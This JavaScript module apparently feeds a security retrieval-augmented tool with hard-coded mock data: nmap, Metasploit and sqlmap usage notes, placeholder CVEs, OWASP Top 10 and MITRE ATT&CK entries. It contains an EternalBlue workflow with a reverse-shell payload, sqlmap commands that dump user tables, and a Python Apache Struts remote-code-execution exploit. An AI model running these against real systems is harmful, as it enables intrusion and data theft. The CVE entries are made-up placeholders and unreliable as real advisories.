/**
 * Security Data Sources Module
 * Integrates various security data sources for RAG
 */

import axios from 'axios';
import cheerio from 'cheerio';
import chalk from 'chalk';
import fs from 'fs/promises';
import path from 'path';
import { DocumentProcessor } from './document-processor.js';

export class SecurityDataSources {
    constructor() {
        this.documentProcessor = new DocumentProcessor();
        this.cacheDir = path.join(process.cwd(), 'data', 'cache');
        this.sources = {
            exploitdb: 'https://www.exploit-db.com',
            nvd: 'https://nvd.nist.gov',
            cveDetails: 'https://www.cvedetails.com',
            mitreAttack: 'https://attack.mitre.org',
            owasp: 'https://owasp.org'
        };
    }

    async initialize() {
        // Ensure cache directory exists
        await fs.mkdir(this.cacheDir, { recursive: true });
    }

    /**
     * Fetch and process Kali Linux tool documentation
     */
    async fetchKaliTools() {
        console.log(chalk.cyan('📦 Fetching Kali Linux tools documentation...'));
        
        const tools = [
            {
                name: 'nmap',
                manPage: `
NAME
    nmap - Network exploration tool and security scanner

SYNOPSIS
    nmap [Scan Type...] [Options] {target specification}

DESCRIPTION
    Nmap ("Network Mapper") is an open source tool for network exploration and security auditing.
    It uses raw IP packets to determine what hosts are available on the network, what services 
    those hosts are offering, what operating systems they are running, what type of packet 
    filters/firewalls are in use, and dozens of other characteristics.

COMMON OPTIONS
    -sS: TCP SYN scan (stealth scan)
    -sT: TCP connect scan
    -sU: UDP scan
    -sV: Service version detection
    -O: Enable OS detection
    -A: Enable OS detection, version detection, script scanning, and traceroute
    -p <port ranges>: Only scan specified ports
    -Pn: Treat all hosts as online (skip host discovery)
    -n: Never do DNS resolution
    -v: Increase verbosity level
    -oN/-oX/-oG <file>: Output scan in normal, XML, or grepable format

EXAMPLES
    nmap -sS -p 1-1000 192.168.1.1
    nmap -A -T4 scanme.nmap.org
    nmap -sV -sC -O -p- 10.0.0.1
                `,
                category: 'reconnaissance'
            },
            {
                name: 'metasploit',
                manPage: `
NAME
    metasploit - The Metasploit Framework

DESCRIPTION
    The Metasploit Framework is a powerful tool for developing, testing, and executing exploits.
    It provides a comprehensive platform for penetration testing, exploit development, and 
    vulnerability research.

CORE COMMANDS
    msfconsole: Start the Metasploit console
    search <term>: Search for exploits, payloads, or auxiliary modules
    use <module>: Select a module for use
    show options: Display module options
    set <option> <value>: Set a module option
    exploit/run: Execute the selected module
    
MODULE TYPES
    - Exploits: Code that takes advantage of a vulnerability
    - Payloads: Code that runs after successful exploitation
    - Auxiliary: Scanning, fuzzing, and other helpful modules
    - Post: Post-exploitation modules
    - Encoders: Encode payloads to avoid detection
    - Nops: No-operation generators for buffer alignment

EXAMPLE WORKFLOW
    msf > search ms17-010
    msf > use exploit/windows/smb/ms17_010_eternalblue
    msf exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
    msf exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
    msf exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10
    msf exploit(ms17_010_eternalblue) > exploit
                `,
                category: 'exploitation'
            },
            {
                name: 'sqlmap',
                manPage: `
NAME
    sqlmap - Automatic SQL injection and database takeover tool

SYNOPSIS
    sqlmap [options]

DESCRIPTION
    sqlmap is an open source penetration testing tool that automates the process of detecting
    and exploiting SQL injection flaws and taking over database servers.

TARGET OPTIONS
    -u URL, --url=URL: Target URL
    -r REQUESTFILE: Load HTTP request from file
    --data=DATA: Data string to be sent through POST

DETECTION OPTIONS
    --level=LEVEL: Level of tests (1-5, default 1)
    --risk=RISK: Risk of tests (1-3, default 1)
    --technique=TECH: SQL injection techniques (B,E,U,S,T,Q)

ENUMERATION OPTIONS
    --dbs: Enumerate databases
    --tables: Enumerate tables
    --columns: Enumerate columns
    --dump: Dump table entries
    --dump-all: Dump all databases tables entries

EXAMPLES
    sqlmap -u "http://site.com/page.php?id=1"
    sqlmap -u "http://site.com/page.php?id=1" --dbs
    sqlmap -u "http://site.com/page.php?id=1" -D database --tables
    sqlmap -u "http://site.com/page.php?id=1" -D database -T users --dump
                `,
                category: 'web_exploitation'
            }
        ];

        const processedTools = [];
        
        for (const tool of tools) {
            const chunks = await this.documentProcessor.processToolDoc(
                tool.name,
                tool.manPage,
                { category: tool.category, type: 'tool_documentation' }
            );
            processedTools.push(...chunks);
        }

        console.log(chalk.green(`✅ Processed ${tools.length} Kali tools`));
        return processedTools;
    }

    /**
     * Fetch CVE data from NVD (mock implementation)
     */
    async fetchCVEData(startDate = '2024-01-01') {
        console.log(chalk.cyan('🔒 Fetching CVE data...'));
        
        // Mock CVE data - in production, use NVD API
        const cves = [
            {
                id: 'CVE-2024-12345',
                description: 'A critical vulnerability in Example Software 1.0 allows remote code execution via crafted packets.',
                cvss: 9.8,
                cwe: 'CWE-78',
                published: '2024-01-15',
                references: ['https://example.com/advisory'],
                affected: ['Example Software 1.0', 'Example Software 1.1']
            },
            {
                id: 'CVE-2024-12346',
                description: 'SQL injection vulnerability in Web Application X allows database access.',
                cvss: 7.5,
                cwe: 'CWE-89',
                published: '2024-01-20',
                references: ['https://example.com/security'],
                affected: ['Web Application X < 2.0']
            }
        ];

        const processedCVEs = [];
        
        for (const cve of cves) {
            const content = `
CVE ID: ${cve.id}
CVSS Score: ${cve.cvss}
CWE: ${cve.cwe}
Published: ${cve.published}

Description:
${cve.description}

Affected Products:
${cve.affected.join(', ')}

References:
${cve.references.join('\n')}
            `.trim();

            const chunks = await this.documentProcessor.splitDocuments(
                [{ 
                    pageContent: content, 
                    metadata: {
                        type: 'cve',
                        cveId: cve.id,
                        cvss: cve.cvss,
                        published: cve.published
                    }
                }],
                'cve'
            );
            
            processedCVEs.push(...chunks);
        }

        console.log(chalk.green(`✅ Processed ${cves.length} CVEs`));
        return processedCVEs;
    }

    /**
     * Fetch ExploitDB entries (mock implementation)
     */
    async fetchExploitDB(limit = 10) {
        console.log(chalk.cyan('💣 Fetching ExploitDB entries...'));
        
        // Mock exploit data
        const exploits = [
            {
                id: 'EDB-50001',
                title: 'Apache Struts 2.x - Remote Code Execution',
                platform: 'linux',
                type: 'webapps',
                author: 'security_researcher',
                date: '2024-01-10',
                code: `
#!/usr/bin/python
# Apache Struts RCE Exploit
# CVE-2024-XXXXX

import requests
import sys

def exploit(target, command):
    payload = {
        'action': f'${{(#_=#attr[\\'struts.valueStack\\']).(@java.lang.Runtime@getRuntime()).exec(\\'{command}\\')}}'
    }
    
    response = requests.post(target, data=payload)
    return response.text

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target> <command>")
        sys.exit(1)
    
    target = sys.argv[1]
    command = sys.argv[2]
    
    result = exploit(target, command)
    print(result)
                `,
                verified: true
            }
        ];

        const processedExploits = [];
        
        for (const exploit of exploits) {
            const chunks = await this.documentProcessor.processExploit({
                ...exploit,
                description: `${exploit.title} - Platform: ${exploit.platform}, Type: ${exploit.type}`
            });
            
            processedExploits.push(...chunks);
        }

        console.log(chalk.green(`✅ Processed ${exploits.length} exploits`));
        return processedExploits;
    }

    /**
     * Fetch OWASP Top 10 information
     */
    async fetchOWASPTop10() {
        console.log(chalk.cyan('🔝 Fetching OWASP Top 10...'));
        
        const owaspTop10 = [
            {
                rank: 'A01:2021',
                name: 'Broken Access Control',
                description: 'Access control enforces policy such that users cannot act outside of their intended permissions.',
                examples: [
                    'Bypassing access control checks by modifying URL',
                    'Viewing or editing someone else\'s account',
                    'Elevation of privilege',
                    'CORS misconfiguration'
                ],
                prevention: [
                    'Implement access control mechanisms once and re-use',
                    'Deny by default',
                    'Implement access control in trusted server-side code',
                    'Log access control failures'
                ]
            },
            {
                rank: 'A02:2021',
                name: 'Cryptographic Failures',
                description: 'Failures related to cryptography which often lead to exposure of sensitive data.',
                examples: [
                    'Use of weak cryptographic algorithms',
                    'Use of weak or default crypto keys',
                    'Missing encryption for sensitive data',
                    'Improper key management'
                ],
                prevention: [
                    'Classify data and apply controls as per classification',
                    'Don\'t store sensitive data unnecessarily',
                    'Encrypt all data in transit',
                    'Use strong adaptive cryptographic functions'
                ]
            },
            {
                rank: 'A03:2021',
                name: 'Injection',
                description: 'Injection flaws occur when untrusted data is sent to an interpreter.',
                examples: [
                    'SQL injection',
                    'NoSQL injection',
                    'Command injection',
                    'LDAP injection'
                ],
                prevention: [
                    'Use parameterized queries',
                    'Use stored procedures',
                    'Validate input',
                    'Escape special characters'
                ]
            }
        ];

        const processedOWASP = [];
        
        for (const item of owaspTop10) {
            const content = `
OWASP ${item.rank}: ${item.name}

Description:
${item.description}

Examples:
${item.examples.map(e => `- ${e}`).join('\n')}

Prevention:
${item.prevention.map(p => `- ${p}`).join('\n')}
            `.trim();

            const chunks = await this.documentProcessor.splitDocuments(
                [{
                    pageContent: content,
                    metadata: {
                        type: 'owasp',
                        rank: item.rank,
                        vulnerability: item.name,
                        source: 'OWASP Top 10 2021'
                    }
                }],
                'security_standard'
            );
            
            processedOWASP.push(...chunks);
        }

        console.log(chalk.green(`✅ Processed OWASP Top 10 entries`));
        return processedOWASP;
    }

    /**
     * Fetch MITRE ATT&CK techniques (mock implementation)
     */
    async fetchMITREAttack() {
        console.log(chalk.cyan('🎯 Fetching MITRE ATT&CK techniques...'));
        
        const techniques = [
            {
                id: 'T1059',
                name: 'Command and Scripting Interpreter',
                description: 'Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.',
                tactics: ['Execution'],
                platforms: ['Windows', 'Linux', 'macOS'],
                detection: 'Monitor command-line arguments, script execution',
                mitigation: 'Disable or restrict scripting languages where possible'
            },
            {
                id: 'T1055',
                name: 'Process Injection',
                description: 'Adversaries may inject code into processes to evade process-based defenses and elevate privileges.',
                tactics: ['Defense Evasion', 'Privilege Escalation'],
                platforms: ['Windows', 'Linux', 'macOS'],
                detection: 'Monitor process behavior and API calls',
                mitigation: 'Use application control and exploit protection'
            }
        ];

        const processedTechniques = [];
        
        for (const technique of techniques) {
            const content = `
MITRE ATT&CK Technique: ${technique.id} - ${technique.name}

Description:
${technique.description}

Tactics: ${technique.tactics.join(', ')}
Platforms: ${technique.platforms.join(', ')}

Detection:
${technique.detection}

Mitigation:
${technique.mitigation}
            `.trim();

            const chunks = await this.documentProcessor.splitDocuments(
                [{
                    pageContent: content,
                    metadata: {
                        type: 'mitre_attack',
                        techniqueId: technique.id,
                        name: technique.name,
                        tactics: technique.tactics
                    }
                }],
                'threat_intelligence'
            );
            
            processedTechniques.push(...chunks);
        }

        console.log(chalk.green(`✅ Processed ${techniques.length} MITRE ATT&CK techniques`));
        return processedTechniques;
    }

    /**
     * Fetch all security data sources
     */
    async fetchAll() {
        console.log(chalk.cyan('🌐 Fetching all security data sources...'));
        
        const allDocuments = [];
        
        // Fetch each data source
        const kaliTools = await this.fetchKaliTools();
        allDocuments.push(...kaliTools);
        
        const cves = await this.fetchCVEData();
        allDocuments.push(...cves);
        
        const exploits = await this.fetchExploitDB();
        allDocuments.push(...exploits);
        
        const owasp = await this.fetchOWASPTop10();
        allDocuments.push(...owasp);
        
        const mitre = await this.fetchMITREAttack();
        allDocuments.push(...mitre);
        
        console.log(chalk.green(`✅ Total documents fetched: ${allDocuments.length}`));
        return allDocuments;
    }

    /**
     * Cache fetched data
     */
    async cacheData(data, filename) {
        const filePath = path.join(this.cacheDir, filename);
        await fs.writeFile(filePath, JSON.stringify(data, null, 2));
        console.log(chalk.green(`✅ Cached data to ${filePath}`));
    }

    /**
     * Load cached data
     */
    async loadCache(filename) {
        const filePath = path.join(this.cacheDir, filename);
        try {
            const data = await fs.readFile(filePath, 'utf-8');
            return JSON.parse(data);
        } catch (error) {
            return null;
        }
    }
}